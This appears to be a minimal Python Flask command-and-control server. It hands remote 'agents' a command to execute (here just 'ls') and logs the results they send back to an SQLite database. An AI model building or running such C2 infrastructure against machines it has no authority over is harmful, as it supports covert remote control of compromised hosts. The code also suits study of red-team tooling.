from flask import Flask, request, jsonify
import sqlite3

app = Flask(__name__)

# Initialize the database
def init_db():
    conn = sqlite3.connect('c2.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id TEXT,
            command TEXT,
            result TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    conn.commit()
    conn.close()

# Route to receive agent check-ins
@app.route('/checkin', methods=['POST'])
def checkin():
    data = request.json
    agent_id = data.get('agent_id')
    command = "ls"  # Example command to execute on the agent
    return jsonify({'command': command})

# Route to receive results from agents
@app.route('/result', methods=['POST'])
def result():
    data = request.json
    agent_id = data.get('agent_id')
    command = data.get('command')
    result = data.get('result')

    # Log the result
    conn = sqlite3.connect('c2.db')
    cursor = conn.cursor()
    cursor.execute('INSERT INTO logs (agent_id, command, result) VALUES (?, ?, ?)', (agent_id, command, result))
    conn.commit()
    conn.close()

    return jsonify({'status': 'success'})

if __name__ == '__main__':
    init_db()
    app.run(host='0.0.0.0', port=5000)
